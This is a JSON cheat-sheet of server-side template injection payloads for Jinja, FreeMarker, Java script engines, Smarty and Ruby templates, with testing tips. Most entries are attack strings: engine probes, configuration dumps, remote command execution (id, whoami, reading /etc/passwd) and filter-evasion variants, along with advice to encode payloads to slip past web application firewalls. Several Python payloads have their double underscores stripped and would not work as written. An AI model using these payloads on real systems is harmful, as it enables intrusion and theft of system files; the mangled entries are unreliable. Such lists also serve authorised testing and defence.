{
    "id": "ssti-payloads",
    "title": "SSTI Payloads",
    "category": "Web Security",
    "command_groups": [
        {
            "subtitle": "Basic Template Detection",
            "info": "Initial payloads to detect template injection vulnerabilities",
            "commands": [
                "[=7*7]",
                "{7*7}",
                "*{7*7}",
                "[[3*3]]",
                "@(3*3)",
                "${= 3*3}",
                "{{ '7'*7 }}",
                "{{= 7*7}}",
                "{{2*2}}[[3*3]]",
                "{{3*3}}",
                "{{3*'3'}}",
                "<%= 3 * 3 %>",
                "${6*6}",
                "${{3*3}}",
                "@(6+5)",
                "#{3*3}",
                "#{ 3 * 3 }",
                "{% debug %}",
                "{{'a'.toUpperCase()}}"
            ]
        },
        {
            "subtitle": "Information Disclosure",
            "info": "Payloads to extract configuration and application data",
            "commands": [
                "{{dump(app)}}",
                "{{app.request.server.all|join(',')}}",
                "{{config.items()}}",
                "{{ request }}",
                "{$smarty.version}",
                "{{request.class}}",
                "{{request|attr('class')}}",
                "{{self}}",
                "{% debug %}"
            ]
        },
        {
            "subtitle": "Python-Specific Exploits",
            "info": "Payloads targeting Python-based template engines",
            "commands": [
                "{{ [].class.base.subclasses() }}",
                "{{''.class.mro()[1].subclasses()}}",
                "{{ ''.class.mro[2].subclasses() }}",
                "{{''.class.base.subclasses()}}",
                "{{''.class.base.subclasses()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}",
                "{{ ''.class.mro[2].subclasses()[40]('/etc/passwd').read() }}",
                "{{ config.items()[4][1].class.mro[2].subclasses()[40]('/etc/passwd').read() }}",
                "{{config.class.init.globals['os'].popen('ls').read()}}",
                "{% for x in ().class.base.subclasses() %}{% if \"warning\" in x.name %}{{x()._module.builtins['import']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
            ]
        },
        {
            "subtitle": "Java Template Exploits",
            "info": "Payloads specifically for Java-based template engines",
            "commands": [
                "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}",
                "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}",
                "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}",
                "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}",
                "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
                "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
            ]
        },
        {
            "subtitle": "Filter Bypass Techniques",
            "info": "Advanced payloads for bypassing security filters",
            "commands": [
                "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
                "{{request|attr([\\\"_\\\"*2,\\\"class\\\",\\\"_\\\"*2]|join)}}",
                "{{request|attr([\\\"\\\",\\\"class\\\",\\\"\\\"]|join)}}",
                "{{['id']|filter('system')}}",
                "{{['cat\\x20/etc/passwd']|filter('system')}}",
                "{{['cat$IFS/etc/passwd']|filter('system')}}",
                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
            ]
        },
        {
            "subtitle": "Ruby Template Exploits",
            "info": "Payloads for Ruby-based template engines",
            "commands": [
                "<%= File.open('/etc/passwd').read %>",
                "{php}echo id;{/php}"
            ]
        }
    ],
    "tips": [
        "Always start with basic detection payloads before attempting more complex exploits",
        "Different template engines require different payload structures",
        "Watch for error messages that might reveal the template engine in use",
        "Use URL encoding to bypass WAF and input filters",
        "Test payloads in different contexts (URL parameters, form fields, headers)",
        "Document successful payloads for each template engine encountered",
        "Be cautious with RCE payloads in production environments",
        "Consider the impact of failed payloads on the application",
        "Monitor response times for blind SSTI detection",
        "Use encoding variations to bypass security filters"
    ]
}
